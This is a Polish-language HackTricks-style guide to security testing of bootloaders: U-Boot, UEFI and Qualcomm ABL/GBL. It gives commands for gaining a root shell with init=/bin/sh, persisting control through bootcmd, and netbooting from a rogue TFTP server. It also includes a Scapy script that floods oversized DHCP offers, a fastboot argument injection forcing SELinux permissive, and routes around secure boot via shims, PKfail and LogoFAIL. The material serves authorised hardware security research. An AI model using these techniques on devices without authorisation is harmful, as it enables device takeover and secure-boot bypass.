# Testowanie bootloadera

{{#include ../../banners/hacktricks-training.md}}

Poniższe kroki są zalecane podczas modyfikowania konfiguracji uruchamiania urządzenia i testowania bootloaderów, takich jak U-Boot i ładowarki klasy UEFI. Skup się na uzyskaniu wczesnego wykonania kodu, ocenie zabezpieczeń podpisu i ochrony przed rollbackiem oraz wykorzystaniu ścieżek odzyskiwania lub rozruchu sieciowego.

Powiązane: obejście secure boot w MediaTek przez patchowanie bl2_ext:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Szybkie zwycięstwa w U-Boot i nadużywanie środowiska

1. Uzyskaj dostęp do powłoki interpretera
   - Podczas uruchamiania naciśnij znany klawisz przerywający (często dowolny klawisz, 0, spację lub specyficzną dla płytki „magiczną” sekwencję), zanim wykona się `bootcmd`, aby przejść do wiersza poleceń U-Boot.<sup>[[1]](#references)</sup>

2. Sprawdź stan uruchamiania i zmienne
   - Przydatne polecenia:
     - `printenv` (wyświetla środowisko)
     - `bdinfo` (informacje o płytce i adresach pamięci)
     - `help bootm; help booti; help bootz` (obsługiwane metody uruchamiania jądra)
     - `help ext4load; help fatload; help tftpboot` (dostępne programy ładujące)

3. Zmodyfikuj argumenty uruchamiania, aby uzyskać powłokę root
   - Dodaj `init=/bin/sh`, aby jądro uruchomiło powłokę zamiast standardowego procesu init:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. Uruchomienie systemu przez sieć z serwera TFTP
   - Skonfiguruj sieć i pobierz z LAN obraz jądra/FIT:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. Utrwal zmiany za pomocą środowiska
   - Jeśli pamięć środowiska nie jest chroniona przed zapisem, możesz utrwalić kontrolę:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - Sprawdź zmienne takie jak `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets`, które wpływają na ścieżki awaryjne. Nieprawidłowo skonfigurowane wartości mogą umożliwiać wielokrotne uzyskiwanie dostępu do powłoki.

6. Sprawdź funkcje debugowania/niebezpieczne funkcje
   - Szukaj: `bootdelay` > 0, wyłączonego `autoboot`, nieograniczonego `usb start; fatload usb 0:1 ...`, możliwości użycia `loady`/`loads` przez port szeregowy, `env import` z niezaufanych nośników oraz kerneli/ramdysków ładowanych bez weryfikacji podpisu.

7. Testowanie obrazów/weryfikacji U-Boot
   - Jeśli platforma deklaruje secure/verified boot z obrazami FIT, wypróbuj zarówno obrazy niepodpisane, jak i zmodyfikowane:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - Brak `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` lub starszego zachowania `verify=n` często umożliwia uruchomienie dowolnych payloadów.
   - Nie poprzestawaj na prostym wyniku zezwolenia/odmowy: najnowsze badania FIT wykazały, że sama ścieżka weryfikacji może być powierzchnią ataku pre-auth. Przeprowadź testy negatywne dla zewnętrznie przechowywanych danych FIT (`data-offset`, `data-position`, `data-size`), wyboru podpisanej konfiguracji, `loadables` oraz obsługi overlay / `extra-conf`.
   - Jeśli masz pasujące drzewo źródłowe, `test/vboot/vboot_test.sh` pozwala szybko odtworzyć zachowanie weryfikacji FIT w U-Boot sandbox, zanim przejdziesz do testowania rzeczywistego sprzętu.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` i przepływy rozruchu skryptów
   - W nowoczesnych kompilacjach U-Boot `bootcmd` często jest jedynie wrapperem dla Standard Boot. Oznacza to, że zapisywalne nośniki, PXE lub pamięć flash SPI mogą stać się faktyczną granicą zaufania, nawet jeśli widoczne środowisko wygląda niegroźnie.
   - `extlinux` bootmeth wyszukuje `extlinux/extlinux.conf` w `/` i `/boot`; script bootmeth najpierw szuka `boot.scr.uimg`, a następnie `boot.scr`. Podczas rozruchu sieciowego nazwa skryptu może pochodzić ze zmiennej `boot_script_dhcp`.
   - Przydatne polecenia do wstępnej analizy:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - Przypadki nadużyć do przetestowania: kontrolowane przez atakującego nośniki USB/SD znajdujące się wcześniej w `boot_targets`, zapisywalny plik `/boot/extlinux/extlinux.conf`, rogue TFTP dostarczający `boot.scr` lub wykonywanie skryptu z SPI przez `script_offset_f`.
   - Jeśli platforma polega na weryfikacji FIT, upewnij się, że konfiguracje są podpisywane na poziomie konfiguracji, a nie tylko poszczególnych obrazów; `required-mode=all` jest bezpieczniejsze niż akceptowanie dowolnego pojedynczego wymaganego klucza.

## Powierzchnia rozruchu sieciowego (DHCP/PXE) i rogue serwery

9. Fuzzing parametrów PXE/DHCP
   - Obsługa starszego BOOTP/DHCP w U-Boot miała problemy z bezpieczeństwem pamięci. Na przykład CVE‑2024‑42040 opisuje ujawnienie pamięci za pośrednictwem spreparowanych odpowiedzi DHCP, które mogą wyciec bajty z pamięci U-Boot do sieci.<sup>[[4]](#references)</sup> Testuj ścieżki kodu DHCP/PXE z nadmiernie długimi wartościami i przypadkami brzegowymi (nazwa pliku rozruchowego w opcji 67, opcje dostawcy, pola nazwy pliku/serwera) i obserwuj, czy występują zawieszenia lub wycieki.
   - Minimalny fragment kodu Scapy do testowania parametrów rozruchu sieciowego:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - Sprawdź również, czy pola nazwy pliku PXE są przekazywane do logiki powłoki/loadera bez sanityzacji, gdy są łączone ze skryptami provisioningu po stronie systemu operacyjnego.

10. Testowanie command injection przez nieautoryzowany serwer DHCP
   - Skonfiguruj nieautoryzowaną usługę DHCP/PXE i spróbuj wstrzyknąć znaki do pól nazwy pliku lub opcji, aby dotrzeć do interpreterów poleceń na dalszych etapach łańcucha rozruchowego. Dobrze sprawdzą się pomocniczy moduł DHCP w Metasploit, `dnsmasq` lub własne skrypty Scapy. Najpierw odizoluj sieć laboratoryjną.

## Tryby odzyskiwania ROM SoC, które zastępują normalny rozruch

Wiele SoC udostępnia tryb „loadera” BootROM, który przyjmuje kod przez USB/UART nawet wtedy, gdy obrazy flash są nieprawidłowe. Jeśli bezpieczny rozruch nie został zablokowany przez bezpieczniki, może to umożliwić wykonanie dowolnego kodu na bardzo wczesnym etapie łańcucha.

- NXP i.MX (Serial Download Mode)
  - Narzędzia: `uuu` (mfgtools3) lub `imx-usb-loader`.
  - Przykład: `imx-usb-loader u-boot.imx`, aby przesłać i uruchomić własny U-Boot z RAM.
- Allwinner (FEL)
  - Narzędzie: `sunxi-fel`.
  - Przykład: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` lub `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
  - Narzędzie: `rkdeveloptool`.
  - Przykład: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin`, aby załadować loader, a następnie przesłać własny U-Boot.

Sprawdź, czy bezpieczniki eFuse/OTP bezpiecznego rozruchu urządzenia zostały przepalone. Jeśli nie, tryby pobierania BootROM często omijają wszelką weryfikację na wyższych poziomach (U-Boot, kernel, rootfs), uruchamiając bezpośrednio pierwszy payload z SRAM/DRAM.

## Programy rozruchowe UEFI/klasy PC: szybkie testy

11. Testowanie manipulacji ESP, cofania wersji i rejestracji kluczy
   - Zamontuj partycję systemową EFI (ESP) i sprawdź, czy zawiera komponenty loadera: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, ścieżki do logo producenta.
   - Jeśli to możliwe, odczytaj stan Secure Boot i bazy danych kluczy z poziomu systemu operacyjnego:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - Jeśli platforma działa w trybie Setup Mode, akceptuje rejestrację kluczy bez uwierzytelniania lub jest dostarczana z testowym/domyslnym Platform Key (klasa PKfail), lokalny administrator lub atakujący mający fizyczny dostęp może zarejestrować własne KEK/db i sprawić, że Secure Boot będzie wyglądał na „włączony”, mimo że uruchamiane będą dowolne pliki binarne EFI.<sup>[[3]](#references)</sup>
   - Spróbuj uruchomić system z użyciem starszych lub znanych podatnych, podpisanych komponentów rozruchowych, jeśli lista unieważnień Secure Boot (dbx) nie jest aktualna. Jeśli platforma nadal ufa starym shimom/menedżerom rozruchu, często można załadować własne jądro lub `grub.cfg` z ESP, aby uzyskać trwały dostęp.

12. Testowanie unieważnień przestarzałych shimów / SBAT / dbx
   - Stare shimy podpisane przez Microsoft oraz forki dostawców mogą nadal umożliwiać ścieżkę uruchomienia bootkita w stylu BYOVD, jeśli listy unieważnień są nieaktualne. W odizolowanym laboratorium umieść historycznie podatny shim na ESP i spróbuj wykonać chainload własnego `grubx64.efi` lub jądra.<sup>[[11]](#references)</sup>
   - Szybka wstępna ocena:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - Jeśli shim nadal się uruchamia, mimo że znajduje się na liście unieważnień, firmware/OS ma nieaktualne aktualizacje `dbx` albo ufa forkowanemu loaderowi, który nigdy nie odziedziczył zabezpieczeń SBAT z upstreamu.

13. Błędy parsowania logo rozruchowego (klasa LogoFAIL)
   - W kilku firmware’ach OEM/IBV występowały podatności związane z parsowaniem obrazów w DXE, które przetwarza logo rozruchowe. Jeśli atakujący może umieścić spreparowany obraz na ESP w ścieżce właściwej dla danego vendora (np. `\EFI\<vendor>\logo\*.bmp`) i ponownie uruchomić urządzenie, możliwe może być wykonanie kodu na wczesnym etapie rozruchu, nawet przy włączonym Secure Boot. Sprawdź, czy platforma akceptuje logo dostarczone przez użytkownika i czy system operacyjny może zapisywać w tych ścieżkach.<sup>[[2]](#references)</sup>


## Luki w zaufaniu ABL + GBL na Androidzie/Qualcomm (Android 16)

Na urządzeniach z Androidem 16, które używają ABL firmy Qualcomm do załadowania **Generic Bootloader Library (GBL)**, sprawdź, czy ABL **uwierzytelnia** aplikację UEFI ładowaną z partycji `efisp`. Jeśli ABL sprawdza jedynie **obecność** aplikacji UEFI i nie weryfikuje jej podpisów, możliwość zapisu do `efisp` pozwala na **wykonanie niepodpisanego kodu przed uruchomieniem systemu**.<sup>[[6]](#references)[[7]](#references)</sup>

Praktyczne kontrole i ścieżki nadużyć:

- **Możliwość zapisu do efisp**: Potrzebujesz sposobu na zapisanie własnej aplikacji UEFI w `efisp` (root/privileged service, błąd w aplikacji OEM, ścieżka recovery/fastboot). Bez tego luki w ładowaniu GBL nie da się bezpośrednio wykorzystać.<sup>[[6]](#references)</sup>
- **Wstrzykiwanie argumentów OEM przez fastboot** (błąd ABL): Niektóre buildy akceptują dodatkowe tokeny w `fastboot oem set-gpu-preemption` i dopisują je do wiersza poleceń jądra. Można to wykorzystać do wymuszenia permissive SELinux, co umożliwia zapis do chronionych partycji:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  Jeśli urządzenie jest załatane, polecenie powinno odrzucać dodatkowe argumenty.<sup>[[5]](#references)[[6]](#references)</sup>
- **Odblokowanie bootloadera za pomocą trwałych flag**: payload na etapie rozruchu może zmienić trwałe flagi odblokowania (np. `is_unlocked=1`, `is_unlocked_critical=1`), aby emulować `fastboot oem unlock` bez wymogu autoryzacji przez serwer OEM. Zmiana ta utrzymuje się po ponownym uruchomieniu.<sup>[[6]](#references)</sup>

Uwagi dotyczące obrony i wstępnej analizy:

- Sprawdź, czy ABL weryfikuje podpis payloadu GBL/UEFI z `efisp`. Jeśli nie, traktuj `efisp` jako powierzchnię wysokiego ryzyka utrwalania dostępu.
- Sprawdź, czy handlery ABL fastboot OEM zostały zmodyfikowane tak, aby **weryfikować liczbę argumentów** i odrzucać dodatkowe tokeny.<sup>[[8]](#references)[[9]](#references)</sup>

## Ostrożność podczas pracy ze sprzętem

Zachowaj ostrożność podczas pracy z pamięcią flash SPI/NAND na wczesnym etapie rozruchu (np. przy uziemianiu pinów w celu ominięcia odczytów) i zawsze sprawdzaj dokumentację układu flash. Zwarcie w niewłaściwym momencie może uszkodzić urządzenie lub programator.

## Uwagi i dodatkowe wskazówki

- Wypróbuj `env export -t ${loadaddr}` i `env import -t ${loadaddr}`, aby przenosić bloki środowiska między pamięcią RAM a pamięcią masową; niektóre platformy umożliwiają importowanie środowiska z nośników wymiennych bez uwierzytelniania.
- W systemach opartych na Linuksie, które uruchamiają się przez `extlinux.conf`, do uzyskania trwałego dostępu często wystarczy zmodyfikować wiersz `APPEND` (wstrzykując `init=/bin/sh` lub `rd.break`) na partycji rozruchowej, jeśli nie są wymuszane kontrole podpisu.
- Jeśli urządzenie docelowe korzysta z aktualizacji w układzie dwóch slotów / A/B, zapoznaj się z technikami anti-rollback i desynchronizacji slotów opisanymi w [przeglądzie analizy firmware](README.md), aby nie przeoczyć luk zaufania dotyczących wyłącznie aktualizatora, które występują poza samym bootloaderem.
- Jeśli przestrzeń użytkownika udostępnia `fw_printenv/fw_setenv`, sprawdź, czy `/etc/fw_env.config` odpowiada rzeczywistej pamięci środowiska. Nieprawidłowe przesunięcia mogą spowodować odczyt lub zapis niewłaściwego obszaru MTD.

## References

- [1] [Metodyka testowania bezpieczeństwa firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Odkrycie LogoFAIL: zagrożenia związane z analizą obrazów podczas rozruchu systemu](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: niezaufane klucze platformy podważają Secure Boot w ekosystemie UEFI](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [Szczegóły CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preempted: odblokowanie Xiaomi za pomocą dwóch niezabezpieczonych ciągów znaków](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Exploit GBL w Qualcomm Snapdragon 8 Elite pozwala atakującym odblokować bootloadery](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Architektura Generic Bootloader (GBL)](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: naprawa przekazywania niezaufanych danych wejściowych do wiersza poleceń jądra](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: dodanie kontroli dla polecenia set-hw-fence-value](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Nie można uruchomić: obejście weryfikacji podpisu FIT w U-Boot](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Informacja o podatności VU#616257 — podpisane przez Microsoft bootloadery UEFI shim podatne na obejście Secure Boot](https://kb.cert.org/vuls/id/616257)
{{#include ../../banners/hacktricks-training.md}}
